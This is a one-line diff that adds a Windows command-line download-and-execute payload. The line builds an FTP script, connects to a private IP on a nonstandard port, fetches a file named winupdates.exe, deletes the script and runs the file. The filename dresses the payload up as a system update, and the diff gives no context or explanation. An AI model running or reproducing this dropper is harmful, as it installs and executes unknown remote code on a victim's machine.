@@ -1,0 +1,1 @@
+cmd /c echo open 192.168.102.17 26659 >> ii &echo user 1 1 >> ii &echo get winupdates.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &winupdates.exe
